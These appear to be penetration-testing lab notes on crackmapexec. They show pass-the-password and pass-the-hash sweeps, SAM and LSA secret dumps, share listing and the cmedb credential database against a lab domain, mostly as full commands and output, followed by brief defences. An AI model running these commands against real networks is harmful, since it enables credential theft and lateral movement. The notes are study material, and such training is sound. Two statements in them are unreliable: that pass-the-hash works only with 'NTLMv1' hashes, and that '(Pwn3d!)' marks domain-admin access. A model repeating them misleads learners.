We are going to use the `crackmapexec` tool to perform the attack using the SMB protocol. However, this can be done via other protocols as well.

```bash
$ crackmapexec --help                                                                                                                          
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {ssh,smb,winrm,ldap,ftp,mssql,rdp} ...

options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {ssh,smb,winrm,ldap,ftp,mssql,rdp}
    ssh                 own stuff using SSH
    smb                 own stuff using SMB
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    ftp                 own stuff using FTP
    mssql               own stuff using MSSQL
    rdp                 own stuff using RDP
```

## Pass the Password

Once we have compromised the credentials of one user, we can use them to sweep the network using it.

```bash
$ crackmapexec smb 192.168.23.0/24 -u fcastle -d MARVEL.local -p Password1                                                                
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         192.168.23.131  445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```

From the `[+]` symbol, we can determine which accounts we were able to login to using the password. The `(Pwn3d!)` indicates which machines we were able to get domain admin in. 

## Pass the Hash

This attack only work with [[New Technology LAN Manager|NTLMv1]] hashes, not with v2. The command to perform the attack is the following.

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         192.168.23.1    445    LENOVO-M75Q      [*] Windows 10.0 Build 26100 x64 (name:LENOVO-M75Q) (domain:LENOVO-M75Q) (signing:True) (SMBv1:False)
SMB         192.168.23.1    445    LENOVO-M75Q      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
```

We see that we are successful in **compromising the local administrator** of the same two machines. This is a common scenario that can be seen in an enterprise network as well. 

The common thing to do when creating a network is for the SysAdmin to *use the same local administrator password in every single machine* in the network. Even this is a really strong password it does not matter since we do not need to crack is. Just passing it around works.

### SAM Dump

In addition to just logging in, we can dump the SAM using `crackmapexec` as well by specifying the `--sam` flag. In addition to dumping them, these will be **stored in a database** well.

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam    
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.131  445    THEPUNISHER      [+] Dumping SAM hashes
SMB         192.168.23.132  445    SPIDERMAN        [+] Dumping SAM hashes
SMB         192.168.23.131  445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.23.132  445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.23.131  445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.132  445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.132  445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.131  445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.131  445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b3add03b24d1f29c29382523ce27a652:::
SMB         192.168.23.132  445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06305620589538b1768e3850f55048d9:::
SMB         192.168.23.131  445    THEPUNISHER      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.23.131  445    THEPUNISHER      [+] Added 5 SAM hashes to the database
SMB         192.168.23.132  445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.23.132  445    SPIDERMAN        [+] Added 5 SAM hashes to the database
```

### Listing Shares

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.131  445    THEPUNISHER      [+] Enumerated shares
SMB         192.168.23.131  445    THEPUNISHER      Share           Permissions     Remark
SMB         192.168.23.131  445    THEPUNISHER      -----           -----------     ------
SMB         192.168.23.131  445    THEPUNISHER      ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.23.131  445    THEPUNISHER      C$              READ,WRITE      Default share
SMB         192.168.23.131  445    THEPUNISHER      IPC$            READ            Remote IPC
SMB         192.168.23.132  445    SPIDERMAN        [+] Enumerated shares
SMB         192.168.23.132  445    SPIDERMAN        Share           Permissions     Remark
SMB         192.168.23.132  445    SPIDERMAN        -----           -----------     ------
SMB         192.168.23.132  445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.23.132  445    SPIDERMAN        C$              READ,WRITE      Default share
SMB         192.168.23.132  445    SPIDERMAN        IPC$            READ            Remote IPC
```

### LSA

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.131  445    THEPUNISHER      [+] Dumping LSA secrets
SMB         192.168.23.131  445    THEPUNISHER      MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-03-07 23:39:10)
SMB         192.168.23.131  445    THEPUNISHER      MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2025-03-13 23:29:42)
SMB         192.168.23.131  445    THEPUNISHER      MARVEL.LOCAL/SqaSKUfcVl:$DCC2$10240#SqaSKUfcVl#4a903eb6b80f87baaf03890d5c835b4d: (2025-03-07 23:44:23)
SMB         192.168.23.131  445    THEPUNISHER      MARVEL\THEPUNISHER$:aes256-cts-hmac-sha1-96:f71a66a6c7700407c59fa5399c524bdfb38c4ee8c57dd10a1f089e3da8306e75
SMB         192.168.23.131  445    THEPUNISHER      MARVEL\THEPUNISHER$:aes128-cts-hmac-sha1-96:0f14b2573aeea308ffa7b4b64ce9b982
SMB         192.168.23.131  445    THEPUNISHER      MARVEL\THEPUNISHER$:des-cbc-md5:8c0b542fe3bc9467
SMB         192.168.23.131  445    THEPUNISHER      MARVEL\THEPUNISHER$:plain_password_hex:904bc51ee392bfcf44a7fb95c0e4b5b6950adb548dafc1787812cc328d21d3d7580f9f798fc345263590d3961daee8647310cae922b951f2d852cb7c078f6437b16641e245263df2a62cd6bb0dfb8c2c96bc9a1b374c6082d9212812e961934b7df0e94c391c9db837a259d2c5c513779dee838443a4f7489b02fd1e6df0eedfc5a57ff29165c0182cf3e0b255dba44123edd7e605a8356e08480289df77bd4dff9332ffa5cd99fd67b6d87056e0d57ebb21be6f1721995a648713b4b4e69dd64b2e399b34669437a06b1a240b78db0ac02caddb1225e4123df0e7877e5532c69e74aa46e4c1fc8bd8651efc53e0a5e5
SMB         192.168.23.131  445    THEPUNISHER      MARVEL\THEPUNISHER$:aad3b435b51404eeaad3b435b51404ee:2a5d646955ce36f130d78437a585dd76:::
SMB         192.168.23.131  445    THEPUNISHER      dpapi_machinekey:0xa93089d3fa8657a0782b58f53f1bc3c0cc02bcca
dpapi_userkey:0xb26c9511f2d5dcd0c1681764228f1a1a7e08dd65
SMB         192.168.23.131  445    THEPUNISHER      NL$KM:166c82d8930ee550ac2e3b1353611efbe38ad919eb782de353ab2595b8de98a4dbf469dacad2dff88cdd95f2b8715a2a83d38cf62450128c2dbce80b3cfdbba6
SMB         192.168.23.131  445    THEPUNISHER      [+] Dumped 10 LSA secrets to /home/kali/.cme/logs/THEPUNISHER_192.168.23.131_2025-03-25_103255.secrets and /home/kali/.cme/logs/THEPUNISHER_192.168.23.131_2025-03-25_103255.cached
```

## Crackmapexec Database

Once we use crackmapexec to dump hashes, they will be automatically saved in a database. We can access them using the `cmedb` command.

```bash
$ cmedb                                                                                                                                    
cmedb (default)(smb) > help

Documented commands (type help <topic>):
========================================
help

Undocumented commands:
======================
back  creds  exit  export  groups  hosts  import  shares

cmedb (default)(smb) > creds

+Credentials---------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| CredID | Admin On  | CredType  | Domain      | UserName           | Password                                                          |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| 1      | 2 Host(s) | plaintext | MARVEL      | fcastle            | Password1                                                         |
| 2      | 1 Host(s) | hash      | THEPUNISHER | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 3      | 1 Host(s) | hash      | SPIDERMAN   | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 4      | 0 Host(s) | hash      | THEPUNISHER | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 5      | 0 Host(s) | hash      | SPIDERMAN   | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 6      | 0 Host(s) | hash      | THEPUNISHER | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 7      | 0 Host(s) | hash      | SPIDERMAN   | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 8      | 0 Host(s) | hash      | THEPUNISHER | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:b3add03b24d1f29c29382523ce27a652 |
| 9      | 0 Host(s) | hash      | SPIDERMAN   | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:06305620589538b1768e3850f55048d9 |
| 10     | 0 Host(s) | hash      | THEPUNISHER | frankcastle        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
| 11     | 0 Host(s) | hash      | SPIDERMAN   | peterparker        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
```

## Defences

It is hard to completely prevent these types of attacks, but we can make it more difficult for an attacker to use it.

1. Limit account re-use
	- Avoid re-using local admin password
	- Disable Guest and Administrator accounts
	- Limit who is a local administrator (*least privilege*)

2. Utilise strong passwords (However, this would not prevent pass the hash attacks)
	- Use longer passwords (>14 characters)
	- Avoid using common words

3. Privilege Access Management (PAM)
	- Check out/in sensitive accounts when needed
	- Automatically rotate passwords on check out and check in
	- Enable **LAPS**

